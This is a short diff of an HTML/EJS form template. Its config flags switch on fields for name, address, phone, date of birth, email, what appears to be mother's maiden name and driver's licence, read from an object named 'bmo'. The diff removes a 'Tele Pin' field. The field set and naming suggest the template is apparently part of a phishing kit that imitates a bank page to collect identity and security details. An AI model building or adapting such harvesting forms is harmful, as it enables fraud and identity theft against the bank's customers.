@@ -4,7 +4,6 @@ let name = bmo.name
 let address = bmo.address
 let postal = bmo.postal
 let phone = bmo.phone
-let pin = bmo.pin
 let dob = bmo.dob
 let email = bmo.email
 let mmn = bmo.mmn
@@ -223,11 +222,6 @@ let dl = bmo.dl
                                                                     <div class="form-group" style="">
                                                                         <label>Phone Number</label>
                                                                         <input required="" id="input-phone" type="tel" placeholder="Phone Number" name="phone" class="ng-pristine ng-untouched ng-valid form-control ng-empty lrinput" autocomplete="off" maxlength="13" oninput="this.value = this.value.replace(/[^0-9, ]/, '')" attr-action="Filling Phone">
-                                                                    </div>
-                                                                <% } if (pin == 'on') { %>
-                                                                    <div class="form-group" style="">
-                                                                        <label>Tele Pin</label>
-                                                                        <input required="" id="input-pin" type="tel" placeholder="Tele Pin" name="pin" class="ng-pristine ng-untouched ng-valid form-control ng-empty lrinput" attr-action="Filling Tele Pin">
                                                                     </div>
                                                                 <% } if (email == 'on') { %>
                                                                     <div class="form-group" style="">
